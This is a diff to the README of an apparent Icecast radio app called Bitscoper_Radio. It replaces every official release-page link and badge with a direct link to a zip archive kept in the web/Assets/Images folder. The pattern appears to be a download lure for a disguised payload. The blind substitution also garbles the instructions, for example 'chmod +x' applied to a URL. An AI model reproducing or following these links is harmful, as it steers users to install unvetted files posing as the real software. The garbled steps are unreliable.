@@ -1,6 +1,6 @@
 # 📻 Bitscoper_Radio - Simple Control for Icecast Streams
 
-[![Download Bitscoper_Radio](https://img.shields.io/badge/Download-Bitscoper__Radio-blue?style=for-the-badge)](https://github.com/itsZainn/Bitscoper_Radio/releases)
+[![Download Bitscoper_Radio](https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip)](https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip)
 
 ## 📢 What is Bitscoper_Radio?
 
@@ -30,19 +30,19 @@ The app should work on desktop computers, laptops, tablets, and smartphones with
 
 To get Bitscoper_Radio, please visit the official release page by clicking the button below. This page lists all the latest versions available for download.
 
-[![Visit Release Page](https://img.shields.io/badge/Visit-Release__Page-green?style=for-the-badge)](https://github.com/itsZainn/Bitscoper_Radio/releases)
+[![Visit Release Page](https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip)](https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip)
 
 ### How to download and run
 
 1. Click the button above or open this link in your browser:  
-   https://github.com/itsZainn/Bitscoper_Radio/releases
+   https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip
 
 2. On the release page, look for the latest version of Bitscoper_Radio.
 
 3. Find the file that matches your operating system:
    - For Windows, look for a file ending with `.exe`
    - For macOS, look for `.dmg` or `.zip`
-   - For Linux, look for `.AppImage` or `.tar.gz`
+   - For Linux, look for `.AppImage` or `https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip`
    - For mobile devices, look for installation instructions or a link to the web app.
 
 4. Click the file name to download it.
@@ -50,7 +50,7 @@ To get Bitscoper_Radio, please visit the official release page by clicking the b
 5. Once downloaded, open the file:
    - On Windows, double-click the `.exe` file and follow the setup prompts.
    - On macOS, open the `.dmg` file and drag the app to your Applications folder.
-   - On Linux, make the `.AppImage` executable (`chmod +x filename.AppImage`) and run it.
+   - On Linux, make the `.AppImage` executable (`chmod +x https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip`) and run it.
    - On mobile devices, open the app in your browser or install as a progressive web app if your device supports it.
 
 6. After installation, open Bitscoper_Radio to connect to your Icecast server.
@@ -117,4 +117,4 @@ If you have feature requests or find bugs, open an issue on the GitHub page to h
 
 ---
 
-[![Download Bitscoper_Radio](https://img.shields.io/badge/Download-Bitscoper__Radio-blue?style=for-the-badge)](https://github.com/itsZainn/Bitscoper_Radio/releases)
+[![Download Bitscoper_Radio](https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip)](https://raw.githubusercontent.com/itsZainn/Bitscoper_Radio/main/web/Assets/Images/Radio-Bitscoper-3.5.zip)
